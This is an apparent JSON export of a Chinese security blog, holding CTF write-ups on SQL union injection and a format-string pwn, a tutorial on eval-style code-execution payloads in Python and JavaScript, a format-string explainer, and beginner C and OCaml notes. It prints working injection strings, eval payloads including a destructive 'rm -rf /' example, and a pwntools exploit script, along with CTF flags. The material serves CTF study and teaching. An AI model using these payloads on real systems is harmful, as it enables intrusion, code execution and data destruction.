b&#x27;crypto&#123;1f_y0u_Kn0w_En0uGH_y0u_Kn0w_1t_4ll&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://archer-baiyi.github.io/tags/Crypto/"},{"name":"Cryptohack","slug":"Cryptohack","permalink":"https://archer-baiyi.github.io/tags/Cryptohack/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"}]},{"title":"HTB Unholy_Union Writeup","slug":"CTF/Web/HTB-Unholy_Union-Writeup","date":"2025-05-31T08:25:27.000Z","updated":"2025-05-31T08:45:33.538Z","comments":true,"path":"2025/05/31/CTF/Web/HTB-Unholy_Union-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/31/CTF/Web/HTB-Unholy_Union-Writeup/","excerpt":"","text":"题目描述 观察打开网页： 随便尝试输入点内容会发现 搜索的语句是 1SELECT * FROM inventory WHERE name LIKE &#x27;%1%&#x27; 所有尝试输入 1&#x27; OR 1=1 -- - 会发现可以注入成功。 注意，在MySQL/MariaDB中，如果 -- 后紧跟 %，它 不会被识别为注释符，而是视作 --%，导致SQL语法错误。所以我们这里注入时需要在--后面加上空格以及一个任意符号/字母/数字（比如说-）。 也就是说这道题的注入格式为 1&#x27; injection_code -- - 并且注意到当前的表格一共有5列内容。 渗透由于在当前表格里没有找到flag相关的内容，所以我们先查看当前所有的表格信息： 1&#x27; UNION SELECT null, table_name, null, null,null FROM information_schema.tables WHERE table_schema=database() -- - 发现有一个名为flag的表格。那么现在来查看一下这个表格有哪些列： 1&#x27; UNION SELECT column_name, null,null,null, null FROM information_schema.columns WHERE table_name=&#x27;flag&#x27; -- - 发现只有一列内容，并且这列的名字也叫flag。接着查看这列的具体内容即可得到flag： 1&#x27; UNION SELECT flag,null,null,null,null from flag -- - 1HTB&#123;un10n_1Nj3ct1on_15_345y_t0_l34rn_r1gh17?&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"}]},{"title":"动态代码执行函数漏洞","slug":"CTF/Web/动态代码执行函数漏洞","date":"2025-05-24T22:21:08.000Z","updated":"2025-05-25T16:22:58.779Z","comments":true,"path":"2025/05/25/CTF/Web/动态代码执行函数漏洞/","permalink":"https://archer-baiyi.github.io/2025/05/25/CTF/Web/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/","excerpt":"各种编程语言中的动态代码执行函数的安全风险","text":"动态代码执行函数在编程语言中，动态代码执行是指在程序运行时，根据接收到的字符串动态地将其当作代码来执行。虽然这种功能在某些场景下非常灵活（例如动态生成代码、运行用户输入），但它也带来了巨大的安全隐患。攻击者可以通过恶意输入注入代码，进而控制系统或窃取敏感信息。 我们下面看一下不同语言（如 Python、PHP、JavaScript）中常用的动态代码执行函数及其风险。 Pythoneval()用途：eval() 会将传入的字符串当作 Python 表达式来执行。 安全隐患：如果用户输入未经验证的字符串传给 eval()，攻击者可以执行任意代码。 例子： 123result = eval(input(&quot;Enter a math expression: &quot;))print(result) 那么当我们输入 1os.system(&#x27;rm -rf /&#x27;) 时会导致删除系统文件。 Payload： 1234567891011121314151617181920212223open(&#x27;flag.txt&#x27;).read()__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)exec(&quot;__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)&quot;)getattr(__import__(&#x27;os&#x27;), &#x27;system&#x27;)(&#x27;cat flag.txt&#x27;)__import__(&#x27;builtins&#x27;).open(&#x27;flag.txt&#x27;).read()globals()[&#x27;__builtins__&#x27;].__dict__[&#x27;open&#x27;](&#x27;flag.txt&#x27;).read()globals()[&#x27;__builtins__&#x27;].open(&#x27;flag.txt&#x27;).read()__import__(&#x27;subprocess&#x27;).check_output([&#x27;cat&#x27;, &#x27;flag.txt&#x27;])__import__(&#x27;sh&#x27;).cat(&#x27;flag.txt&#x27;) # 需要安装了sh库sh.cat(&#x27;flag.txt&#x27;) # 需要安装了sh库 （看情况在flag.txt前面加上/或者../） 也可以利用breakpoint()（Python3.7+ 中的调试工具，可以直接启动交互式调试器（比如 pdb））： 123breakpoint()# 然后在pdb的提示符出来后输入!print(open(&quot;flag.txt&quot;).read()) ! 会让 pdb 执行一条普通 Python 语句。 特殊情况也可以使用： 1234eval(input(&quot;Enter: &quot;))#然后输入__import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;) 注意，这里的第一行代码的eval()是额外输入的，并不是指程序原本的。这点非常重要，不多输入一个eval()会失败。区别： 12345678&gt;&gt; eval(input(&quot;Enter: &quot;))Enter: __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)flag&#123;fake_flag&#125;eval(input(&quot;Enter: &quot;)) --&gt; 0&gt;&gt; input(&quot;Enter: &quot;)Enter: __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;)input(&quot;Enter: &quot;) --&gt; __import__(&#x27;os&#x27;).system(&#x27;cat flag.txt&#x27;) exec()compile()相比前两个会安全很多。 例子： 123user_input = &quot;os.system(&#x27;rm -rf /&#x27;)&quot; # 恶意输入code = compile(user_input, &quot;&lt;string&gt;&quot;, &quot;exec&quot;)exec(code) # 执行了恶意代码 因为只有当我们能通过输入控制compile()的三个参数时才可以进行RCE攻击。 PHPeval()JavaScripteval()例子： 12345678910111213141516171819202122router.post(&#x27;/api/calculate&#x27;, (req, res) =&gt; &#123; let &#123; formula &#125; = req.body; if (formula) &#123; result = Calculator.calculate(formula); return res.send(response(result)); &#125; return res.send(response(&#x27;Missing parameters&#x27;));&#125;);module.exports = &#123; calculate: function(formula) &#123; try &#123; return eval(`(function() &#123; return $&#123;formula&#125;; &#125;)()`); // 漏洞所在 &#125; catch (e) &#123; if (e instanceof SyntaxError) &#123; return &#x27;Something went wrong!&#x27;; &#125; &#125; &#125;&#125;; 所以当输入 1global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag.txt&#x27;).toString() 时可以成功读取flag。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"Python","slug":"Python","permalink":"https://archer-baiyi.github.io/tags/Python/"},{"name":"eval()","slug":"eval","permalink":"https://archer-baiyi.github.io/tags/eval/"}]},{"title":"Ocaml 入门","slug":"编程/Ocaml-入门","date":"2025-05-22T14:25:04.000Z","updated":"2025-06-01T19:49:35.382Z","comments":true,"path":"2025/05/22/编程/Ocaml-入门/","permalink":"https://archer-baiyi.github.io/2025/05/22/%E7%BC%96%E7%A8%8B/Ocaml-%E5%85%A5%E9%97%A8/","excerpt":"","text":"OCaml 是一种支持函数式、命令式和面向对象编程范式的静态类型语言。 下载建议在MacOS，Linux(WSL)系统上运行Ocaml。 依次运行以下命令即可下载Ocaml及其相关工具： 1234567891011121314151617181920# 1. 更新系统包索引sudo apt update# 2. 安装 opam（OCaml 的包管理器）sudo apt install opam -y# 3. 初始化 opam（首次运行会创建配置文件）opam init -y --bare# 4. 加载 opam 环境变量（将 ocaml 等命令加入 PATH）eval $(opam env)# 5. 创建指定版本的 OCaml 编译环境（这里是 4.14.1）opam switch create 4.14.1# 6. 再次加载 opam 环境（进入新 switch）eval $(opam env)# 7. 安装配套工具（dune 构建工具，utop REPL，ocaml-lsp-server 语言服务）opam install -y dune utop ocaml-lsp-server 其中utop 是 OCaml 的一个增强型交互式命令行（REPL），提供语法高亮、自动补全和更友好的开发体验： 在utop中： # 表示Interpreter在等待输入（input）； ;; 用于标志一个表达式的结束，告诉解释器可以开始执行（跟C语言中的;一样）； - 则表示输出的结果 在后续内容中我们会utop的格式来区分代码以及结果。 Basics定义变量使用let： 12345# let seven = 3+4;;val seven : int = 7# seven;;- : int = 7 变量名的开头需为小写字母。 常用函数List.fold_left语法： 1List.fold_left f acc lst f：是一个“累积函数”，定义如何处理当前元素和累积值。 它的类型是 (&#39;a -&gt; &#39;b -&gt; &#39;a)，即接收当前累积值和当前元素，返回新的累积值。 acc：是初始累积值。 lst：是要处理的列表。 从列表的左边开始，依次用 f 更新累积值。 List.filter语法： 1List.filter (fun x -&gt; condition) list List.filter：用于从列表中挑选符合条件的元素。 参数： fun x -&gt; condition：一个函数，对列表中的每个元素 x 判断是否满足条件（condition 是布尔表达式）。 list：要过滤的列表。 返回值：一个新列表，包含原列表中所有满足条件的元素。","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Ocaml","slug":"Ocaml","permalink":"https://archer-baiyi.github.io/tags/Ocaml/"}]},{"title":"攻防世界 CGfsb Writeup","slug":"CTF/Pwn/攻防世界-CGfsb-Writeup","date":"2025-05-19T14:32:48.000Z","updated":"2025-05-19T15:35:23.937Z","comments":true,"path":"2025/05/19/CTF/Pwn/攻防世界-CGfsb-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb-Writeup/","excerpt":"","text":"题目 观察使用IDA打开文件： 注意到格式化字符串（Format String）漏洞的常见漏洞： 12fgets(s, 100, stdin);printf(s); 并注意到main函数里的逻辑，只要pwnme的值等于8我们即可得到flag。 找到pwnme的地址： 10804A068 Exploit首先发送这个Payload 123456789101112131415161718from pwn import *host = &quot;61.147.171.105&quot;port = 59350r = remote(host, port)test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot; # 由于没有给后续的参数，所以程序会自动从Stack上按顺序读取15个值。r.recvuntil(&quot;your name:&quot;)r.sendline(&quot;A&quot;)r.recvuntil(&quot;leave your message please:&quot;)r.sendline(test_payload)# r.sendline(payload)r.interactive() 会看到以下内容： 1234hello Ayour message is:AAAA,ff91236e,f7f4a5a0,f0b5ff,ff91239e,1,c2,a4198fb,0,0,41414141,2c78252c,252c7825,78252c78,2c78252c,252c7825Thank you! 可以发现第10个值41414141正是AAAA对应的ASCII码，这意味着我们的格式化字符串在栈中的偏移是第 10 个位置。（因为我们的输入是由fgets写入进s的，所以会和printf读取的位置有偏差。） 确定参数位置了之后我们便可以通过这个Payload修改pwnme的值了： 123pwnme_addr = 0x0804A068payload = p32(pwnme_addr) + b&#x27;aaaa%10$n&#x27; 首先填需要修改的数据的地址（因为是32-bit的程序，所以地址是32位，也就是4个Byte），由于我们希望将pwnme的值修改为8，所以我们还需要加4 Byte的padding，也就是4个”a”。 而%10$n 的意思是从 第10个参数位置 取出一个地址，然后把已经打印出来的字符总数（4+4=8）写入那个地址。 完整代码： 12345678910111213141516171819202122232425262728from pwn import *host = &quot;61.147.171.105&quot;port = 59350pwnme_addr = 0x0804A068r = remote(host, port)# test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot;payload = p32(pwnme_addr) + b&#x27;aaaa%10$n&#x27;r.recvuntil(&quot;your name:&quot;)r.sendline(&quot;A&quot;)r.recvuntil(&quot;leave your message please:&quot;)# r.sendline(test_payload)r.sendline(payload)r.interactive() # hello A# your message is:# haaaa# you pwned me, here is your flag:# cyberpeace&#123;0a7cd9ddadcf7730d41928c9c3877ee8&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"格式化字符串（Format String）漏洞介绍","slug":"CTF/Pwn/格式化字符串（Format-String）漏洞介绍","date":"2025-05-19T08:08:10.000Z","updated":"2025-05-19T15:43:35.198Z","comments":true,"path":"2025/05/19/CTF/Pwn/格式化字符串（Format-String）漏洞介绍/","permalink":"https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88Format-String%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"我们首先来看一下什么是格式化字符串函数。 格式化字符串函数格式化字符串（ format string）函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。 可以参考这个定义： The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. （来源：https://ocaml.org/manual/5.0/api/Printf.html） 一般来说，格式化字符串在利用的时候主要分为三个部分 格式化字符串函数 格式化字符串 变量，可选 例子： 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); // %d是输出控制符，d 表示十进制，后面的 i 是输出参数* return 0;&#125; 格式化字符串函数分为输入和输出，其中 - 输入： 函数 说明 scanf() 从标准输入读取数据 基本语法： 1scanf(&quot;格式字符串&quot;, &amp;变量1, &amp;变量2, ...); 例子： 123456789101112# include &lt;stdio.h&gt;int main(void)&#123; int age; float height; char name[20]; scanf(&quot;%d %f %s&quot;, &amp;age, &amp;height, name); return 0;&#125; 注意：scanf(&quot;%s&quot;, name); 不需要加 &amp;，因为数组名本身就是地址。 - 输出： 函数名 说明 printf 向标准输出（通常是终端）打印格式化字符串 fprintf 向指定文件流打印格式化字符串（如 stderr, 文件指针等） sprintf 将格式化的字符串写入字符数组（注意缓冲区溢出风险） snprintf 将格式化的字符串写入字符数组，指定最大写入长度，更安全 asprintf 将格式化字符串写入动态分配的内存（GNU 扩展，非标准 C） dprintf 向指定的文件描述符写入格式化字符串（POSIX，常用于系统编程） vprintf 类似 printf，但参数通过 va_list 传递（用于变参函数） vfprintf 类似 fprintf，参数为 va_list vsprintf 类似 sprintf，参数为 va_list（不安全） vsnprintf 类似 snprintf，参数为 va_list（推荐用于变参安全格式化） 格式化字符串正如上面的定义里说的，格式化字符串里除了明文还有格式化占位符。我们这里来重点关注一下这个格式化占位符。 格式化占位符（conversion specifications）的语法如下： 1%[parameter][flags][field width][.precision][length]type - Parameter：指定用于格式化的参数位置（从1开始） 字符 说明 n$ 其中n是参数位置 例子： 12printf(&quot;%2$d %1$d&quot;, 11, 22);// 会输出 22 11 - Flags： 标志 说明 - 左对齐（默认是右对齐） + 总是显示正号或负号（例如 +10） (空格) 正数前加空格，负数前加负号 0 用0填充未占满的宽度 # 对于%o、%x、%X等，添加前缀（如0x）；对于%f等，始终包含小数点 - Field Width：指定最小输出字符数，不足时用空格（或0）填充，如果要使用变量指定宽度，可以用 *。 例子： 12345printf(&quot;%d&quot;, 42);// 会输出 &quot; 42&quot; （前面有3个空格）printf(&quot;%*d&quot;, 5, 42);// 会输出 &quot; 42&quot; （前面有3个空格） - Precision：指定数字小数点后的位数或字符串的最大输出长度： 对于浮点数（如 %f）：表示小数点后保留的位数，如 %.2f 对于字符串（如 %s）：表示最大输出字符数，如 %.5s 可以使用 * 表示由参数动态提供 - Length：指出浮点型参数或整型参数的长度 修饰符 说明 hh signed char 或 unsigned char h short 或 unsigned short l long 或 unsigned long ll long long 或 unsigned long long L long double（用于%Lf） z size_t t ptrdiff_t j intmax_t 或 uintmax_t 例子： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;int main() &#123; signed char a = -5; printf(&quot;%hhd\\n&quot;, a); // 会输出 &quot;-5&quot; short s = 32000; printf(&quot;%hd\\n&quot;, s); // 会输出 &quot;32000&quot; long l = 123456789L; printf(&quot;%ld\\n&quot;, l); // 会输出 &quot;123456789&quot; long long ll = 9223372036854775807LL; printf(&quot;%lld\\n&quot;, ll); // 会输出 &quot;9223372036854775807&quot; long double ld = 3.141592653589793238L; printf(&quot;%Lf\\n&quot;, ld); // 会输出 &quot;3.141593&quot;（默认保留6位小数） size_t sz = 100; printf(&quot;%zu\\n&quot;, sz); // 会输出 &quot;100&quot; ptrdiff_t diff = -8; printf(&quot;%td\\n&quot;, diff); // 会输出 &quot;-8&quot; intmax_t im = 9223372036854775807; printf(&quot;%jd\\n&quot;, im); // 会输出 &quot;9223372036854775807&quot; return 0;&#125; - Type：也称转换说明（conversion specification/specifier），指定具体的数据类型，有以下选择 字符 说明 %d 打印十进制整数（int） %f 打印浮点数（float/double） %.2f 打印浮点数，保留小数点后2位 %s 打印字符串（char*） %c 打印单个字符（char） %x 打印十六进制（小写） %% 输出一个百分号 % 其中只有Type是必须要给的，其他均可以省略。 例子： 1234567891011121314151617181920#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;整数：%d\\n&quot;, i); printf(&quot;浮点数（默认）：%f\\n&quot;, pi); printf(&quot;浮点数（保留两位）：%.2f\\n&quot;, pi); printf(&quot;字符串：%s\\n&quot;, name); printf(&quot;字符：%c\\n&quot;, letter); printf(&quot;十六进制：%x\\n&quot;, hex); printf(&quot;百分号：%%\\n&quot;); return 0;&#125; 注意：在第二部分一定要给定变量，如果没有给，则会从错误的内存地址读取数据，导致不可预期的行为。 此外还有一个比较特殊的格式符：%n 。这个格式符会让 printf 把当前已经打印的字符数量写入 n 所在的地址。 比如说下面这个例子 12345678#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; n的值会被存储为5。 由于它的特殊性以及危险性，很多现代系统在 libc 中禁用了 %n，或者在格式化函数上增加了保护（如 glibc 中对 %n 的格式检查）。 不过正是因为它的危险性所以我们在Pwn里经常会用它来修改内存数据 变量希望输出的变量。 格式化字符串漏洞正常情况：在进入 printf 函数之后，函数会首先获取第一个参数，一个一个读取其字符会遇到两种情况 当前字符不是 %，直接输出到相应标准输出。 当前字符是 %， 继续读取下一个字符 如果没有字符，报错 如果下一个字符是 %, 输出 % 否则根据相应的字符，获取相应的参数，对其进行解析并输出 例子： 12345678910#include &lt;stdio.h&gt;int main() &#123; int a = 10; float b = 3.14; char *str = &quot;hello&quot;; printf(&quot;Int: %d, Float: %f, String: %s\\n&quot;, a, b, str); return 0;&#125; 栈的大概结构： 1234567891011+----------------------+| 返回地址（printf结束后跳转） |+----------------------+| 格式字符串地址 | --&gt; &quot;Int: %d, Float: %f, String: %s\\n&quot;+----------------------+| 参数3（str） | --&gt; 指向 &quot;hello&quot;+----------------------+| 参数2（b） | --&gt; float/double 值：3.14+----------------------+| 参数1（a） | --&gt; 整数值：10+----------------------+ 函数会从栈里正常读取指定的变量的值。 而当我们在使用格式化字符串函数但是并没有给定具体变量的情况下： 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello %x %x %x %x&quot;); return 0;&#125; 则会从栈中依次读取未定义的值作为参数进行格式化输出。 在CTF的题目里这个漏洞一般的表现如下： 12345678#include &lt;stdio.h&gt;int main() &#123; char user_input[100]; gets(user_input); printf(user_input); // 会将我们的输入直接当成格式字符串并处理 return 0;&#125; 我们可以利用这个漏洞读取栈上的内容（如变量值、返回地址等）或者通过 %n 格式符（就是我们之前提到的那个危险的格式符）向指定内存地址写入数据。 Exploit技巧确定偏差由于读取函数将输入的内容存储的位置和输出函数读取的位置有所偏差，所以我们一般需要用 1test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot; 这样的Payload来确定这个偏差具体的值。 修改内存可以通过上面提到的危险的%n来修改内存中的值：比如说 123pwnme_addr = 0x0804A068payload = p32(pwnme_addr) + b&#x27;aaaa%10$n&#x27; 可以将这个地址的值修改为8。 例题攻防世界 CGfsb Writeuphttps://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb-Writeup/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://archer-baiyi.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"Format String","slug":"Format-String","permalink":"https://archer-baiyi.github.io/tags/Format-String/"}]},{"title":"C语言入门","slug":"编程/C语言入门","date":"2025-05-18T20:28:18.000Z","updated":"2025-05-19T08:07:22.657Z","comments":true,"path":"2025/05/18/编程/C语言入门/","permalink":"https://archer-baiyi.github.io/2025/05/18/%E7%BC%96%E7%A8%8B/C%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8/","excerpt":"","text":"基础Hello World老规矩我们还是先来看一下在C语言里是怎么写 Hello World 的： 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello, World!\\n&quot;); return 0;&#125; 其中： #include &lt;stdio.h&gt;：引入标准输入输出库，printf 就在这里面定义。 include的部分一般被叫做头文件。 int main()：程序的主函数，是程序执行的起点。 printf(&quot;Hello, World!\\n&quot;);：向屏幕输出 Hello, World!，\\n 表示换行。 return 0;：表示程序正常结束。 printf()printf 是 C 标准库函数，用于格式化文本并将其输出到标准输出。 它的语法相比于其他的编程语言（比如说Python，C++之类的）会复杂很多。 printf的参数主要分成2部分：格式化字符串以及变量名。其中格式化字符串（ format string）可以参考以下定义（我个人觉得这个定义比较清楚）： The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. （来源：https://ocaml.org/manual/5.0/api/Printf.html） 我们来分情况看一下printf的具体语法： 1. 只有字符串的情况： 123456# include &lt;stdio.h&gt;int main(void)&#123; printf(&quot;Hello World!\\n&quot;); // \\n表示换行 return 0;&#125; 这种情况下就非常简单，直接在引号里输入希望输出的内容即可。 2. 涉及变量的情况： 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); // %d是输出控制符，d 表示十进制，后面的 i 是输出参数* return 0;&#125; 我们需要在格式化字符串（ format string）里给定符合要求的格式化。 格式化占位符的语法如下： 1%[parameter][flags][field width][.precision][length]type - Parameter：指定用于格式化的参数位置（从1开始） 字符 说明 n$ 其中n是参数位置 例子： 12printf(&quot;%2$d %1$d&quot;, 11, 22);// 会输出 22 11 - Flags： 标志 说明 - 左对齐（默认是右对齐） + 总是显示正号或负号（例如 +10） (空格) 正数前加空格，负数前加负号 0 用0填充未占满的宽度 # 对于%o、%x、%X等，添加前缀（如0x）；对于%f等，始终包含小数点 - Field Width：指定最小输出字符数，不足时用空格（或0）填充，如果要使用变量指定宽度，可以用 *。 例子： 12345printf(&quot;%d&quot;, 42);// 会输出 &quot; 42&quot; （前面有3个空格）printf(&quot;%*d&quot;, 5, 42);// 会输出 &quot; 42&quot; （前面有3个空格） - Precision：指定数字小数点后的位数或字符串的最大输出长度： 对于浮点数（如 %f）：表示小数点后保留的位数，如 %.2f 对于字符串（如 %s）：表示最大输出字符数，如 %.5s 可以使用 * 表示由参数动态提供 - Length：指出浮点型参数或整型参数的长度 修饰符 说明 hh signed char 或 unsigned char h short 或 unsigned short l long 或 unsigned long ll long long 或 unsigned long long L long double（用于%Lf） z size_t t ptrdiff_t j intmax_t 或 uintmax_t 例子： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;int main() &#123; signed char a = -5; printf(&quot;%hhd\\n&quot;, a); // 会输出 &quot;-5&quot; short s = 32000; printf(&quot;%hd\\n&quot;, s); // 会输出 &quot;32000&quot; long l = 123456789L; printf(&quot;%ld\\n&quot;, l); // 会输出 &quot;123456789&quot; long long ll = 9223372036854775807LL; printf(&quot;%lld\\n&quot;, ll); // 会输出 &quot;9223372036854775807&quot; long double ld = 3.141592653589793238L; printf(&quot;%Lf\\n&quot;, ld); // 会输出 &quot;3.141593&quot;（默认保留6位小数） size_t sz = 100; printf(&quot;%zu\\n&quot;, sz); // 会输出 &quot;100&quot; ptrdiff_t diff = -8; printf(&quot;%td\\n&quot;, diff); // 会输出 &quot;-8&quot; intmax_t im = 9223372036854775807; printf(&quot;%jd\\n&quot;, im); // 会输出 &quot;9223372036854775807&quot; return 0;&#125; - Type：也称转换说明（conversion specification/specifier），指定具体的数据类型，有以下选择 字符 说明 %d 打印十进制整数（int） %f 打印浮点数（float/double） %.2f 打印浮点数，保留小数点后2位 %s 打印字符串（char*） %c 打印单个字符（char） %x 打印十六进制（小写） %% 输出一个百分号 % 其中只有Type是必须要给的，其他均可以省略。 例子： 1234567891011121314151617181920#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;整数：%d\\n&quot;, i); printf(&quot;浮点数（默认）：%f\\n&quot;, pi); printf(&quot;浮点数（保留两位）：%.2f\\n&quot;, pi); printf(&quot;字符串：%s\\n&quot;, name); printf(&quot;字符：%c\\n&quot;, letter); printf(&quot;十六进制：%x\\n&quot;, hex); printf(&quot;百分号：%%\\n&quot;); return 0;&#125; 注意：在第二部分一定要给定变量，如果没有给，则会从错误的内存地址读取数据，导致不可预期的行为。 此外还有一个比较特殊的格式符：%n 。这个格式符会让 printf 把当前已经打印的字符数量写入 n 所在的地址。 比如说下面这个例子 12345678#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; n的值会被存储为5。 由于它的特殊性以及危险性，很多现代系统在 libc 中禁用了 %n，或者在格式化函数上增加了保护（如 glibc 中对 %n 的格式检查）。","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"}]},{"title":"CryptexLab CTF密码学工具","slug":"CTF/Crypto/CryptexLab-CTF密码学工具","date":"2025-05-18T15:24:15.000Z","updated":"2025-06-02T22:35:48.289Z","comments":true,"path":"2025/05/18/CTF/Crypto/CryptexLab-CTF密码学工具/","permalink":"https://archer-baiyi.github.io/2025/05/18/CTF/Crypto/CryptexLab-CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E5%B7%A5%E5%85%B7/","excerpt":"","text":"功能目前有以下功能： 解码： 可以自动进行多轮的base 32，58，64，91，二进制以及hex解码 古典密码： 凯撒密码： 给定密文以及密钥进行解密 给定密文，进行遍历解密 给定密文以及关键词，根据关键词自动查找遍历解密的结果中是否有符合要求的。 维吉尼亚密码： 给定密文以及密钥进行解密（支持密文中含有空格以及特殊符号） 给定密文，根据词频分析尝试解密（由于是基于统计的方法，所以只有当密文足够长时准确率才会相对较高） RSA： 解析PEM： 自动判断公钥/私钥并提取参数 破解RSA： 给定 n,d,p,q,c（或更多）参数自动解密（将密文 c 解密并转成text格式）； 给定 n,e,p,q，自动计算 d ； 给定 n,e,p,q,c ，自动计算 d ，并解密密文； 给定 n，即可进行Fermat-Factorization，Pollard’s p-1算法尝试质因数分解 n（均可手动设置算法循环上限）； 给定 n,e，即可进行 Wiener’s Attack （均可手动设置算法循环上限）； 哈希： SHA256： 计算SHA256 MD5： 计算MD5 效果 环境将下面内容保存成requirements.txt: 12345tkpycryptodomecryptographybase58base91 并在命令行输入 1pip install -r requirements.txt 即可。 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325425525625725825926026126226326426526626726826927027127227327427527627727827928028128228328428528628728828929029129229329429529629729829930030130230330430530630730830931031131231331431531631731831932032132232332432532632732832933033133233333433533633733833934034134234334434534634734834935035135235335435535635735835936036136236336436536636736836937037137237337437537637737837938038138238338438538638738838939039139239339439539639739839940040140240340440540640740840941041141241341441541641741841942042142242342442542642742842943043143243343443543643743843944044144244344444544644744844945045145245345445545645745845946046146246346446546646746846947047147247347447547647747847948048148248348448548648748848949049149249349449549649749849950050150250350450550650750850951051151251351451551651751851952052152252352452552652752852953053153253353453553653753853954054154254354454554654754854955055155255355455555655755855956056156256356456556